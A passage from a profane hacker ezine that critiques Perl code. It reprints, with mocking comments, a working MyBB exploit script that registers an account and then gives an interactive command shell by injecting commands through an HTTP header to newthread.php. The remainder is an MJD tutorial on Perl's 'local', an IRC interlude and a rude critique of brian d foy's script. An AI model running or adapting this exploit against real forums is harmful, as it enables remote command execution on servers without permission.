  &#39;proxy=s&#39;           =&gt; \$proxy,
  &#39;proxy_user=s&#39;      =&gt; \$proxy_user,
  &#39;proxy_pass=s&#39;      =&gt; \$proxy_pass,
  &#39;debug&#39;             =&gt; \$debug,
  &#39;1&#39;		      =&gt; \$first_time,
  &#39;tid=s&#39;	      =&gt; \$tid,
  &#39;delete&#39;	      =&gt; \$del);

# 1 is not a good option

&amp;help unless ($host); # please don&#39;t try this at home.
# yes, don&#39;t.
# help() unless $host;

$dir = &quot;/&quot; unless($dir);
# drop the parens bitch

print &quot;$host - $dir\n&quot;;
if ($host !~ /^http/) {
	$host = &quot;http://&quot;.$host;
}

LWP::Debug::level(&#39;+&#39;) if $debug;
my ($res, $req);

my $ua = new LWP::UserAgent(
           cookie_jar=&gt; { file =&gt; &quot;$$.cookie&quot; });
$ua-&gt;agent(&quot;Mothilla/5.0 (THIS IS AN EXPLOIT. IDS, PLZ, Gr4b ME!!!&quot;);
$ua-&gt;proxy([&#39;http&#39;] =&gt; $proxy) if $proxy;
$req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

create_user() if $first_time;
# see, there you go!

while () {
		login() if !$logged;

		print &quot;mybibi&gt; &quot;; # lost connection
		while(&lt;STDIN&gt;) {
				$command=$_;
				chomp($command);
				last;
		}
		# chomp(my $command = &lt;STDIN&gt;); # you fucking noob
		&amp;send($command);
}

sub send  {
	chomp (my $cmd = shift);
	my $h = $host.$dir.&quot;/newthread.php&quot;;
	my $req = POST $h, [
		&#39;subject&#39; =&gt; &#39;514&#39;, # neg on the quoting
		&#39;message&#39; =&gt; &#39;/slap 514&#39;,
		&#39;previewpost&#39; =&gt; &#39;Preview Post&#39;,
		&#39;action&#39; =&gt; &#39;do_newthread&#39;,
		&#39;fid&#39; =&gt; $tid,
		&#39;posthash&#39; =&gt; &#39;e0561b22fe5fdf3526eabdbddb221caa&#39;
	];
	$req-&gt;header($uservar =&gt; $cmd);
	print $req-&gt;as_string() if $debug;
	my $res = $ua-&gt;request($req);
	if ($res-&gt;content =~ /You may not post in this/) {
		print &quot;[!] don&#39;t have perms to post. Change the Forum ID\n&quot;;
	} else {
		my ($data) = $res-&gt;content =~ m/(.*?)\&lt;\!DOCT/is; 
	# still with the rat nasty regex
		print $data;
	}

}
sub login {
	my $h  = $host.$dir.&quot;/member.php&quot;;
	my $req = POST $h,[
		&#39;username&#39; =&gt; $username,
		&#39;password&#39; =&gt; $password,
		&#39;submit&#39; =&gt; &#39;Login&#39;,
		&#39;action&#39; =&gt; &#39;do_login&#39;
	];
	my $res = $ua-&gt;request($req);
	if ($res-&gt;content =~ /You have successfully been logged/is) {
	# there are also useful string commands like index()
		print &quot;[*] Login succesful!\n&quot;;
		$logged = 1;
	} else {
		print &quot;[!] Error login-in\n&quot;;
	}
	# damn, this sub wasn&#39;t even bad! 
}

sub help {
    print &quot;Syntax: ./$0 --host=url --dir=/mybb [options] -1 --tid=2\n&quot;;
    print &quot;\t--proxy (http), --proxy_user, --proxy_pass\n&quot;;
    print &quot;\t--debug\n&quot;;
    print &quot;the default directory is /\n&quot;;
    print &quot;\nExample\n&quot;;
    print &quot;bash# $0 --host=http(s)://www.server.com/\n&quot;;
    print &quot;\n&quot;;
    exit(1);
	# use heredocs, and keep your spacing consistent with other code
}

sub create_user {
	# firs we need to get the img.
	my  $h = $host.$dir.&quot;/member.php&quot;;
	print &quot;Host: $h\n&quot;;

	$req = HTTP::Request-&gt;new (GET =&gt; $h.&quot;?action=register&quot;);
	$res = $ua-&gt;request ($req);

	my $req = POST $h, [
		&#39;action&#39; =&gt; &quot;register&quot;,
		&#39;agree&#39; =&gt; &quot;I Agree&quot;
	];
	print $req-&gt;as_string() if $debug;
	$res = $ua-&gt;request($req);

	my $content = $res-&gt;content();
	# unnecessary .* sitting around 
	# read the fucking manual and learn regex
	# perldoc perlre
	# perldoc perlretut
	# perldoc perlrequick
	# perldoc perlreref
	$content =~ m/.*(image\.php\?action.*?)\&quot;.*/is;
	my $img = $1;
	# you didn&#39;t see our trick last time?
	my $req = HTTP::Request-&gt;new (GET =&gt; $host.$dir.&quot;/&quot;.$img);
	$res = $ua-&gt;request ($req);
	print $req-&gt;as_string();

	if ($res-&gt;content) {
		open (TMP, &quot;&gt;/tmp/file.png&quot;) or die($!);
		print TMP $res-&gt;content;
		close (TMP);
		# UGLY
		print &quot;[*] /tmp/file.png created.\n&quot;;
	}

	my ($hash) = $img =~ m/hash=(.*?)$/;
	# see, you know this trick

	my $img_str = get_img_str();
	unlink (&quot;/tmp/file.png&quot;);
	$img_str =~ s/\n//g;
	my $req = POST $h, [
		&#39;username&#39; =&gt; $username,
		&#39;password&#39; =&gt; $password,
		&#39;password2&#39; =&gt; $password,
		&#39;email&#39; =&gt; $email,
		&#39;email2&#39; =&gt; $email,
		&#39;imagestring&#39; =&gt; $img_str,
		&#39;imagehash&#39; =&gt; $hash,
		&#39;allownotices&#39; =&gt; &#39;yes&#39;,
		&#39;receivepms&#39; =&gt; &#39;yes&#39;,
		&#39;pmpopup&#39; =&gt; &#39;no&#39;,
		&#39;action&#39; =&gt; &quot;do_register&quot;,
		&#39;regsubmit&#39; =&gt; &quot;Submit Registration&quot;
	];
	$res = $ua-&gt;request($req);
	print $req-&gt;as_string() if $debug;

	open (OUT, &quot;&gt;mybibi_out.html&quot;);
	print OUT $res-&gt;content;

	print &quot;Check $email for confirmation or mybibi_out.html if there are some error\n&quot;;
}

sub get_img_str ()
{
	print &quot;\nNow I need the text shown in /tmp/file.png: &quot;;
	my $str = &lt;STDIN&gt;;
	return $str;
}
exit 0;

This comes across as shitty code, with little bits that you stole from coders that actually know how to code.

-[0x0E] # School You: MJD ------------------------------------------------

Introduction

In my article Coping With Scoping I offered the advice ``Always use my; never use local.&#39;&#39; The most
common use for both is to provide your subroutines with private variables, and for this application
you should always use my, and never local. But many readers (and the tech editors) noted that local
isn&#39;t entirely useless; there are cases in which my doesn&#39;t work, or doesn&#39;t do what you want. So I
promised a followup article on useful uses for local. Here they are.

1. Special Variables

my makes most uses of local obsolete. So it&#39;s not surprising that the most common useful uses of
local arise because of peculiar cases where my happens to be illegal.

The most important examples are the punctuation variables such as $&quot;, $/, $^W, and $_. Long ago
Larry decided that it would be too confusing if you could my them; they&#39;re exempt from the normal
package scheme for the same reason. So if you want to change them, but have the change apply to
only part of the program, you&#39;ll have to use local.

As an example of where this might be useful, let&#39;s consider a function whose job is to read in an
entire file and return its contents as a single string:


	sub getfile {
	  my $filename = shift;
	  open F, &quot;&lt; $filename&quot; or die &quot;Couldn&#39;t open `$filename&#39;: $!&quot;;
	  my $contents = &#39;&#39;;
	  while (&lt;F&gt;) {
	    $contents .= $_;
	  }
	  close F;
	  return $contents;
	}

This is inefficient, because the &lt;F&gt; operator makes Perl go to all the trouble of breaking the file
into lines and returning them one at a time, and then all we do is put them back together again.
It&#39;s cheaper to read the file all at once, without all the splitting and reassembling. (Some people
call this slurping the file.) Perl has a special feature to support this: If the $/ variable is
undefined, the &lt;...&gt; operator will read the entire file all at once:


	sub getfile {
	  my $filename = shift;
	  open F, &quot;&lt; $filename&quot; or die &quot;Couldn&#39;t open `$filename&#39;: $!&quot;;
	  $/ = undef;		      # Read entire file at once
	  $contents = &lt;F&gt;;	      # Return file as one single `line&#39;
	  close F;
	  return $contents;
	}

There&#39;s a terrible problem here, which is that $/ is a global variable that affects the semantics
of every &lt;...&gt; in the entire program. If getfile doesn&#39;t put it back the way it was, some other
part of the program is probably going to fail disastrously when it tries to read a line of input
and gets the whole rest of the file instead. Normally we&#39;d like to use my, to make the change local
to the functions. But we can&#39;t here, because my doesn&#39;t work on punctuation variables; we would get
the error


	Can&#39;t use global $/ in &quot;my&quot; ...

if we tried. Also, more to the point, Perl itself knows that it should look in the global variable
$/ to find the input record separator; even if we could create a new private varible with the same
name, Perl wouldn&#39;t know to look there. So instead, we need to set a temporary value for the global
variable $/, and that is exactly what local does:


	sub getfile {
	  my $filename = shift;
	  open F, &quot;&lt; $filename&quot; or die &quot;Couldn&#39;t open `$filename&#39;: $!&quot;;
	  local $/ = undef;	      # Read entire file at once
	  $contents = &lt;F&gt;;	      # Return file as one single `line&#39;
	  close F;
	  return $contents;
	}

The old value of $/ is restored when the function returns. In this example, that&#39;s enough for
safety. In a more complicated function that might call some other functions in a library somewhere,
we&#39;d still have to worry that we might be sabotaging the library with our strange $/. It&#39;s probably
best to confine changes to punctuation variables to the smallest possible part of the program:


	sub getfile {
	  my $filename = shift;
	  open F, &quot;&lt; $filename&quot; or die &quot;Couldn&#39;t open `$filename&#39;: $!&quot;;
	  my $contents;
	  { local $/ = undef;	  # Read entire file at once
	    $contents = &lt;F&gt;;	  # Return file as one single `line&#39;
	  }			  # $/ regains its old value
	  close F;
	  return $contents;
	}

This is a good practice, even for simple functions like this that don&#39;t call any other subroutines.
By confining the changes to $/ to just the one line we want to affect, we&#39;ve prevented the
possibility that someone in the future will insert some calls to other functions that will break
because of the change. This is called defensive programming.

Although you may not think about it much, localizing $_ this way can be very important. Here&#39;s a
slightly different version of getfile, one which throws away comments and blank lines from the file
that it gets:


	sub getfile {
	  my $filename = shift;
	  local *F;
	  open F, &quot;&lt; $filename&quot; or die &quot;Couldn&#39;t open `$filename&#39;: $!&quot;;
	  my $contents;
	  while (&lt;F&gt;) {
	    s/#.*//;		  # Remove comments
	    next unless /\S/;	  # Skip blank lines
	    $contents .= $_;	  # Save current (nonblank) line
	  }
	  return $contents;
	}

This function has a terrible problem. Here&#39;s the terrible problem: If you call it like this:


	foreach (@array) {
	  ...
	  $f = getfile($filename);
	  ...
	}

it clobbers the elements of @array. Why? Because inside a foreach loop, $_ is aliased to the
elements of the array; if you change $_, it changes the array. And getfile does change $_. To
prevent itself from sabotaging the $_ of anyone who calls it, getfile should have local $_ at the
top.

Other special variables present similar problems. For example, it&#39;s sometimes convenient to change
$&quot;, $,, or $\ to alter the way print works, but if you don&#39;t arrange to put them back the way they
were before you call any other functions, you might get a big disaster:

# Good style:
{ local $&quot; = &#39;)(&#39;;
  print &#39;&#39;Array a: (@a)\n``;
}
# Program continues safely...

Another common situation in which you want to localize a special variable is when you want to
temporarily suppress warning messages. Warnings are enabled by the -w command-line option, which in
turn sets the variable $^W to a true value. If you reset $^W to a false value, that turns the
warnings off. Here&#39;s an example: My Memoize module creates a front-end to the user&#39;s function and
then installs it into the symbol table, replacing the original function. That&#39;s what it&#39;s for, and
it would be awfully annyoying to the user to get the warning


	Subroutine factorial redefined at Memoize.pm line 113

every time they tried to use my module to do what it was supposed to do. So I have


  {
    local $^W = 0;		      # Shut UP!
    *{$name} = $tabent-&gt;{UNMEMOIZED}; # Otherwise this issues a warning
  }

which turns off the warning for just the one line. The old value of $^W is automatically restored
after the chance of getting the warning is over.

2. Localized Filehandles

Let&#39;s look back at that getfile function. To read the file, it opened the filehandle F. That&#39;s
fine, unless some other part of the program happened to have already opened a filehandle named F,
in which case the old file is closed, and when control returns from the function, that other part
of the program is going to become very confused and upset. This is the `filehandle clobbering
problem&#39;.

This is exactly the sort of problem that local variables were supposed to solve. Unfortunately,
there&#39;s no way to localize a filehandle directly in Perl.

Well, that&#39;s actually a fib. There are three ways to do it:
You can cast a magic spell in which you create an anonymous glob, extract the filehandle from it,
and discard the rest of the glob.

You can use the Filehandle or IO::Handle modules, which cast the spell I just described, and
present you with the results, so that you don&#39;t have to perform any sorcery yourself.

See below.

The simplest and cheapest way to solve the `filehandle clobbering problem&#39; is a little bit obscure.
You can&#39;t localize the filehandle itself, but you can localize the entry in Perl&#39;s symbol table
that associates the filehandle&#39;s name with the filehandle. This entry is called a `glob&#39;. In Perl,
variables don&#39;t have names directly; instead the glob has a name, and the glob gathers together the
scalar, array, hash, subroutine, and filehandle with that name. In Perl, the glob named F is
denoted with *F.

To localize the filehandle, we actually localize the entire glob, which is a little hamfisted:


	sub getfile {
	  my $filename = shift;
	  local *F;
	  open F, &quot;&lt; $filename&quot; or die &quot;Couldn&#39;t open `$filename&#39;: $!&quot;;
	  local $/ = undef;	      # Read entire file at once
	  $contents = &lt;F&gt;;	      # Return file as one single `line&#39;
	  close F;
	  return $contents;
	}

local on a glob does the same as any other local: It saves the current value somewhere, creates a
new value, and arranges that the old value will be restored at the end of the current block. In
this case, that means that any filehandle that was formerly attached to the old *F glob is saved,
and the open will apply to the filehandle in the new, local glob. At the end of the block,
filehandle F will regain its old meaning again.

This works pretty well most of the time, except that you still have the usual local worries about
called subroutines changing the localized values on you. You can&#39;t use my here because globs are
all about the Perl symbol table; the lexical variable mechanism is totally different, and there is
no such thing as a lexical glob.

With this technique, you have the new problem that getfile() can&#39;t get at $F, @F, or %F either,
because you localized them all, along with the filehandle. But you probably weren&#39;t using any
global variables anyway. Were you? And getfile() won&#39;t be able to call &amp;F, for the same reason.
There are a few ways around this, but the easiest one is that if getfile() needs to call &amp;F, it
should name the local filehandle something other than F.

use FileHandle does have fewer strange problems. Unfortunately, it also sucks a few thousand lines
of code into your program. Now someone will probably write in to complain that I&#39;m exaggerating,
because it isn&#39;t really 3,000 lines, some of those are white space, blah blah blah. OK, let&#39;s say
it&#39;s only 300 lines to use FileHandle, probably a gross underestimate. It&#39;s still only one line to
localize the glob. For many programs, localizing the glob is a good, cheap, simple way to solve the
problem.

Localized Filehandles, II

When a localized glob goes out of scope, its open filehandle is automatically closed. So the close
F in getfile is unnecessary:


	sub getfile {
	  my $filename = shift;
	  local *F;
	  open F, &quot;&lt; $filename&quot; or die &quot;Couldn&#39;t open `$filename&#39;: $!&quot;;
	  local $/ = undef;	      # Read entire file at once
	  return &lt;F&gt;;		      # Return file as one single `line&#39;
	}  # F is automatically closed here

That&#39;s such a convenient feature that it&#39;s worth using even when you&#39;re not worried that you might
be clobbering someone else&#39;s filehandle.

The filehandles that you get from FileHandle and IO::Handle do this also.

Marginal Uses of Localized Filehandles

As I was researching this article, I kept finding common uses for local that turned out not to be
useful, because there were simpler and more straightforward ways to do the same thing without using
local. Here is one that you see far too often:

People sometimes want to pass a filehandle to a subroutine, and they know that you can pass a
filehandle by passing the entire glob, like this:


	   $rec = read_record(*INPUT_FILE);


	   sub read_record {
	     local *FH = shift;
	     my $record;
	     read FH, $record, 1024;
	     return $record;
	   }

Here we pass in the entire glob INPUT_FILE, which includes the filehandle of that name. Inside of
read_record, we temporarily alias FH to INPUT_FILE, so that the filehandle FH inside the function
is the same as whatever filehandle was passed in from outside. The when we read from FH, we&#39;re
actually reading from the filehandle that the caller wanted. But actually there&#39;s a more
straightforward way to do the same thing:


	   $rec = read_record(*INPUT_FILE);


	   sub read_record {
	     my $fh = shift;
	     my $record;
	     read $fh, $record, 1024;
	     return $record;
	   }

You can store a glob into a scalar variable, and you can use such a variable in any of Perl&#39;s I/O
functions wherever you might have used a filehandle name. So the local here was unnecessary.

Dirhandles

Filehandles and dirhandles are stored in the same place in Perl, so everything this article says
about filehandles applies to dirhandles in the same way.

3. The First-Class Filehandle Trick

Often you want to put filehandles into an array, or treat them like regular scalars, or pass them
to a function, and you can&#39;t, because filehandles aren&#39;t really first-class objects in Perl. As
noted above, you can use the FileHandle or IO::Handle packages to construct a scalar that acts
something like a filehandle, but there are some definite disadvantages to that approach.

Another approach is to use a glob as a filehandle; it turns out that a glob will fit into a scalar
variable, so you can put it into an array or pass it to a function. The only problem with globs is
that they are apt to have strange and magical effects on the Perl symbol table. What you really
want is a glob that has been disconnected from the symbol table, so that you can just use it like a
filehandle and forget that it might once have had an effect on the symbol table. It turns out that
there is a simple way to do that:


	my $filehandle = do { local *FH };

do just introduces a block which will be evaluated, and will return the value of the last
expression that it contains, which in this case is local *FH. The value of local *FH is a glob. But
what glob?

local takes the existing FH glob and temporarily replaces it with a new glob. But then it
immediately goes out of scope and puts the old glob back, leaving the new glob without a name. But
then it returns the new, nameless glob, which is then stored into $filehandle. This is just what we
wanted: A glob that has been disconnected from the symbol table.

You can make a whole bunch of these, if you want:


	for $i (0 .. 99) {
	  $fharray[$i] = do { local *FH };
	}

You can pass them to subroutines, return them from subroutines, put them in data structures, and
give them to Perl&#39;s I/O functions like open, close, read, print, and &lt;...&gt; and they&#39;ll work just
fine.

4. Aliases

Globs turn out to be very useful. You can assign an entire glob, as we saw above, and alias an
entire symbol in the symbol table. But you don&#39;t have to do it all at once. If you say


	*GLOB = $reference;

then Perl only changes the meaning of part of the glob. If the reference is a scalar reference, it
changes the meaning of $GLOB, which now means the same as whatever scalar the reference referred
to; @GLOB, %GLOB and the other parts don&#39;t change at all. If the reference is a hash reference,
Perl makes %GLOB mean the same as whatever hash the reference referred to, but the other parts stay
the same. Similarly for other kinds of references.

You can use this for all sorts of wonderful tricks. For example, suppose you have a function that
is going to do a lot of operations on $_[0]{Time}[2] for some reason. You can say


	*arg = \$_[0]{Time}[2];

and from then on, $arg is synonymous with $_[0]{Time}[2], which might make your code simpler, and
probably more efficient, because Perl won&#39;t have to go digging through three levels of indirection
every time. But you&#39;d better use local, or else you&#39;ll permanently clobber any $arg variable that
already exists. (Gurusamy Sarathy&#39;s Alias module does this, but without the local.)

You can create locally-scoped subroutines that are invisible outside a block by saying


	*mysub = sub { ... } ;

and then call them with mysub(...). But you must use local, or else you&#39;ll permanently clobber any
mysub subroutine that already exists.

5. Dynamic Scope

local introduces what is called dynamic scope, which means that the `local&#39; variable that it
declares is inherited by other functions called from the one with the declaration. Usually this
isn&#39;t what you want, and it&#39;s rather a strange feature, unavailable in many programming languages.
To see the difference, consider this example:


	first();


	sub first {
	  local $x = 1;
	  my	$y = 1;
	  second();
	}


	sub second {
	  print &quot;x=&quot;, $x, &quot;\n&quot;;
	  print &quot;y=&quot;, $y, &quot;\n&quot;;
	}

The variable $y is a true local variable. It&#39;s available only from the place that it&#39;s declared up
to the end of the enclosing block. In particular, it&#39;s unavailable inside of second(), which prints
&quot;y=&quot;, not &quot;y=1&quot;. This is is called lexical scope.

local, in contrast, does not actually make a local variable. It creates a new `local&#39; value for a
global variable, which persists until the end of the enclosing block. When control exits the block,
the old value is restored. But the variable, and its new `local&#39; value, are still global, and hence
accessible to other subroutines that are called before the old value is restored. second() above
prints &quot;x=1&quot;, because $x is a global variable that temporarily happens to have the value 1. Once
first() returns, the old value will be restored. This is called dynamic scope, which is a misnomer,
because it&#39;s not really scope at all.

For `local&#39; variables, you almost always want lexical scope, because it ensures that variables that
you declare in one subroutine can&#39;t be tampered with by other subroutines. But every once in a
strange while, you actually do want dynamic scope, and that&#39;s the time to get local out of your bag
of tricks.

Here&#39;s the most useful example I could find, and one that really does bear careful study. We&#39;ll
make our own iteration syntax, in the same family as Perl&#39;s grep and map. Let&#39;s call it `listjoin&#39;;
it&#39;ll combine two lists into one:


	@list1 = (1,2,3,4,5);
	@list2 = (2,3,5,7,11);
	@result = listjoin { $a + $b } @list1, @list2;

Now the @result is (3,5,8,11,16). Each element of the result is the sum of the corresponding terms
from @list1 and @list2. If we wanted differences instead of sums, we could have put { $a - $b }. In
general, we can supply any code fragment that does something with $a and $b, and listjoin will use
our code fragment to construct the elements in the result list.

Here&#39;s a first cut at listjoin:


	sub listjoin (&amp;\@\@) {

Ooops! The first line already has a lot of magic. Let&#39;s stop here and sightsee a while before we go
on. The (&amp;\@\@) is a prototype. In Perl, a prototype changes the way the function is parsed and the
way its arguments are passed.

In (&amp;\@\@), The &amp;amp; warns the Perl compiler to expect to see a brace-delimited block of code as
the first argument to this function, and tells Perl that it should pass listjoin a reference to
that block. The block behaves just like an anonymous function. The \@\@ says that listjoin should
get two other arguments, which must be arrays; Perl will pass listjoin references to these two
arrays. If any of the arguments are missing, or have the wrong type (a hash instead of an array,
for example) Perl will signal a compile-time error.

The result of this little wad of punctuation is that we will be able to write


	listjoin { $a + $b } @list1, @list2;

and Perl will behave as if we had written


	listjoin(sub { $a + $b }, \@list1, \@list2);

instead. With the prototype, Perl knows enough to let us leave out the parentheses, the sub, the
first comma, and the slashes. Perl has too much punctuation already, so we should take advantage of
every opportunity to use less.

Now that that&#39;s out of the way, the rest of listjoin is straightforward:


	sub listjoin (&amp;\@\@) {
	  my $code = shift;	     # Get the code block
	  my $arr1 = shift;	     # Get reference to first array
	  my $arr2 = shift;	     # Get reference to second array
	  my @result;
	  while (@$arr1 &amp;&amp; @$arr2) {
	    my $a = shift @$arr1;    # Element from array 1 into $a
	    my $b = shift @$arr2;    # Element from array 2 into $b
	    push @result, &amp;$code();  # Execute code block and get result
	  }
	  return @result;
	}

listjoin simply runs a loop over the elements in the two arrays, putting elements from each into $a
and $b, respectively, and then executing the code and pushing the result into @result. All very
simple and nice, except that it doesn&#39;t work: By declaring $a and $b with my, we&#39;ve made them
lexical, and they&#39;re unavailable to the $code.

Removing the my&#39;s from $a and $b makes it work:


	    $a = shift @$arr1;
	    $b = shift @$arr2;

But this solution is boobytrapped. Without the my declaration, $a and $b are global variables, and
whatever values they had before we ran listjoin are lost now.

The correct solution is to use local. This preserves the old values of the $a and $b variables, if
there were any, and restores them when listjoin() is finished. But because of dynamic scoping, the
values set by listjoin() are inherited by the code fragment. Here&#39;s the correct solution:


	sub listjoin (&amp;\@\@) {
	  my $code = shift;
	  my $arr1 = shift;
	  my $arr2 = shift;
	  my @result;
	  while (@$arr1 &amp;&amp; @$arr2) {
	    local $a = shift @$arr1;
	    local $b = shift @$arr2;
	    push @result, &amp;$code();
	  }
	  return @result;
	}

You might worry about another problem: Suppose you had strict &#39;vars&#39; in force. Shouldn&#39;t listjoin {
$a + $b } be illegal? It should be, because $a and $b are global variables, and the purpose of
strict &#39;vars&#39; is to forbid the use of unqualified global variables.

But actually, there&#39;s no problem here, because strict &#39;vars&#39; makes a special exception for $a and
$b. These two names, and no others, are exempt from strict &#39;vars&#39;, because if they weren&#39;t, sort
wouldn&#39;t work either, for exactly the same reason. We&#39;re taking advantage of that here by giving
listjoin the same kind of syntax. It&#39;s a peculiar and arbitrary exception, but one that we&#39;re happy
to take advantage of.

Here&#39;s another example in the same vein:


	sub printhash (&amp;\%) {
	  my $code = shift;
	  my $hash = shift;
	  local ($k, $v);
	  while (($k, $v) = each %$hash) {
	    print &amp;$code();
	  }
	}

Now you can say


	printhash { &quot;$k =&gt; $v\n&quot; } %capitals;

and you&#39;ll get something like


	Athens =&gt; Greece
	Moscow =&gt; Russia
	Helsinki =&gt; Finland

or you can say


	printhash { &quot;$k,&quot; } %capitals;

and you&#39;ll get


	Athens,Moscow,Helsinki,

Note that because I used $k and $v here, you might get into trouble with strict &#39;vars&#39;. You&#39;ll
either have to change the definition of printhash to use $a and $b instead, or you&#39;ll have to use
vars qw($k $v).

6. Dynamic Scope Revisited

Here&#39;s another possible use for dynamic scope: You have some subroutine whose behavior depends on
the setting of a global variable. This is usually a result of bad design, and should be avoided
unless the variable is large and widely used. We&#39;ll suppose that this is the case, and that the
variable is called %CONFIG.

You want to call the subroutine, but you want to change its behavior. Perhaps you want to trick it
about what the configuration really is, or perhaps you want to see what it would do if the
configuration were different, or you want to try out a fake configuration to see if it works. But
you don&#39;t want to change the real global configuration, because you don&#39;t know what bizarre effects
that will have on the rest of the program. So you do


	local %CONFIG = (new configuration here);
	the_subroutine();

The changed %CONFIG is inherited by the subroutine, and the original configuration is restored
automatically when the declaration goes out of scope.

Actually in this kind of circumstance you can sometimes do better. Here&#39;s how: Suppose that the
%CONFIG hash has lots and lots of members, but we only want to change $CONFIG{VERBOSITY}. The
obvious thing to do is something like this:


	my %new_config = %CONFIG;	 # Copy configuration
	$new_config{VERBOSITY} = 1000;	 # Change one member
	local %CONFIG = %new_config;	 # Copy changed back, temporarily
	the_subroutine();		 # Subroutine inherits change

But there&#39;s a better way:


	local $CONFIG{VERBOSITY} = 1000; # Temporary change to one member!
	the_subroutine();

You can actually localize a single element of an array or a hash. It works just like localizing any
other scalar: The old value is saved, and restored at the end of the enclosing scope.

Marginal Uses of Dynamic Scoping

Like local filehandles, I kept finding examples of dynamic scoping that seemed to require local,
but on further reflection didn&#39;t. Lest you be tempted to make one of these mistakes, here they are.

One application people sometimes have for dynamic scoping is like this: Suppose you have a
complicated subroutine that does a search of some sort and locates a bunch of items and returns a
list of them. If the search function is complicated enough, you might like to have it simply
deposit each item into a global array variable when its found, rather than returning the complete
list from the subroutine, especially if the search subroutine is recursive in a complicated way:


	sub search {
	  # do something very complicated here
	  if ($found) {
	    push @solutions, $solution;
	  }
	  # do more complicated things
	}

This is dangerous, because @solutions is a global variable, and you don&#39;t know who else might be
using it.

In some languages, the best answer is to add a front-end to search that localizes the global
@solutions variable:


	sub search {
	  local @solutions;
	  realsearch(@_);
	  return @solutions;
	}


	sub realsearch {
	  # ... as before ...
	}

Now the real work is done in realsearch, which still gets to store its solutions into the global
variable. But since the user of realsearch is calling the front-end search function, any old value
that @solutions might have had is saved beforehand and restored again afterwards.

There are two other ways to accomplish the same thing, and both of them are better than this way.
Here&#39;s one:


	{ my @solutions;  # This is private, but available to both functions
	  sub search {
	    realsearch(@_);
	    return @solutions;
	  }


	  sub realsearch {
	    # ... just as before ...
	    # but now it modifies a private variable instead of a global one.
	  }
	}

Here&#39;s the other:


	sub search {
	  my @solutions;
	  realsearch(\@solutions, @_);
	  return @solutions;
	}


	sub realsearch {
	  my $solutions_ref = shift;
	  # do something very complicated here
	  if ($found) {
	    push @$solutions_ref, $solution;
	  }
	  # do more complicated things
	}

One or the other of these strategies will solve most problems where you might think you would want
to use a dynamic variable. They&#39;re both safer than the solution with local because you don&#39;t have
to worry that the global variable will `leak&#39; out into the subroutines called by realsearch.

One final example of a marginal use of local: I can imagine an error-handling routine that examines
the value of some global error message variable such as $! or $DBI::errstr to decide what to do. If
this routine seems to have a more general utility, you might want to call it even when there wasn&#39;t
an error, because you want to invoke its cleanup behavor, or you like the way it issues the error
message, or whatever. It should accept the message as an argument instead of examining some fixed
global variable, but it was badly designed and now you can&#39;t change it. If you&#39;re in this kind of
situation, the best solution might turn out to be something like this:


	local $DBI::errstr = &quot;Your shoelace is untied!&quot;;
	handle_error();

Probably a better solution is to find the person responsible for the routine and to sternly remind
them that functions are more flexible and easier to reuse if they don&#39;t depend on hardwired global
variables. But sometimes time is short and you have to do what you can.

7. Perl 4 and Other Relics

A lot of the useful uses for local became obsolete with Perl 5; local was much more useful in Perl
4. The most important of these was that my wasn&#39;t available, so you needed local for private
variables.

If you find yourself programming in Perl 4, expect to use a lot of local. my hadn&#39;t been invented
yet, so we had to do the best we could with what we had.

Summary

Useful uses for local fall into two classes: First, places where you would like to use my, but you
can&#39;t because of some restriction, and second, rare, peculiar or contrived situations.

For the vast majority of cases, you should use my, and avoid local whenever possible. In
particular, when you want private variables, use my, because local variables aren&#39;t private.

Even the useful uses for local are mostly not very useful.

Revised rule of when to use my and when to use local:
(Beginners and intermediate programmers.) Always use my; never use local unless you get an error
when you try to use my.

(Experts only.) Experts don&#39;t need me to tell them what the real rules are.

-[0x0F] # Intermission ---------------------------------------------------

&lt;Hobbes&gt; brian d foy?
&lt;Hobbes&gt; are you fuckin kiddin me?
&lt;Hobbes&gt; do you know what that means
&lt;Kant&gt; that I&#39;ve vastly expanded our realm of attack?
&lt;Kant&gt; that I&#39;ve ruined any and all remaining opportunity for support from the mainstream perl community?
&lt;Kant&gt; that I&#39;ve continued on our path of suicidal aggravation?
&lt;Hobbes&gt; um yah no shit
&lt;Hobbes&gt; thats not good
&lt;Socrates&gt; Sure it is. That is what we are here for, after all.
&lt;Kant&gt; :]
&lt;Hobbes&gt; youre insane
&lt;Hobbes&gt; both of you
&lt;Kant&gt; no YOU&#39;RE insane
&lt;Kant&gt; the rest of us are perfectly fine with the situation
&lt;Socrates&gt; Actually, I think you should write this one, Hobbes.
&lt;Hobbes&gt; :(

-[0x10] # Part Two: Back to School ---------------------------------------

Are you excited? Time for some of us to go back to schooling, and for some
others to go back to getting schooled. It is publication season again. Other
ezines such as h0no, hackthiszine, and Zero for 0wned have set the pace. It 
is time to be serious. It is time to hit the books. Time to crack some
skulls.

-[0x11] # brian d fucking foy --------------------------------------------

brian d foy, the man, the legend. He&#39;s a teacher, a leader, and an icon. He&#39;s the right hand man in
Stonehenge. The man has authored Perl books and the Perl Review, and has contributed many modules 
to CPAN. He&#39;s everywhere. We all know his name.

For our School You sections of positive literature we tend to select articles or items of code that
impress us, or interest us, or just leave a smile on our face. For this issue we deliberately went
looking for some random brian d foy code, as we did for many others who had so far been excluded. 
We were shocked that instead of brilliance, we came across this. We really were trying to be good,
happy, brian d foy fans.

There was a small issue as to whether or not we could pursue this. The code isn&#39;t bad, but it has
weaknesses and shows a clear lack of attention. The same ethics that made us attack the elite and
famous for their shit code makes us obligated to strike here, where the Perl should be impeccable.
This critique is still very soft. brian d foy doesn&#39;t need to justify his sometimes odd or archaic
design and/or syntax methods. The release isn&#39;t bad either, because it is a script I&#39;m sure some
found useful, and is essentially modest.

#!/usr/bin/perl

# no strict? no warnings?

open my( $pipe ), &quot;du -a |&quot;;

my $files = Local::lines-&gt;new;

while( &lt;$pipe&gt; )
	{
	chomp;
	my( $size, $file ) = split /\s+/, $_, 2;
	next if -d $file;
	next if $file eq &quot;.&quot;;
	$files-&gt;add( $size, &quot;$file&quot; ); # must you make me cry?
	# how could you quote that?
	# brian d foy, what were you on?
	}

package Local::lines;

use Curses;
use vars qw($win %rindex);

use constant MAX  =&gt;  24;
use constant SIZE =&gt;  0;
use constant NAME =&gt;  1;
use Data::Dumper qw(Dumper);

# A lot of this code makes me question just how old it is
# It isn&#39;t old, these are just, shall we say, &quot;historical&quot;, choices.
# Although I will ask, why the hell is this file structured as it is?

sub new
	{
	my $self = bless [], __PACKAGE__;

	$self-&gt;init();

	return $self;
	# why the vocal return here only?
	}

sub init
	{
	my $self = shift;

	initscr;
	$win = Curses-&gt;new;

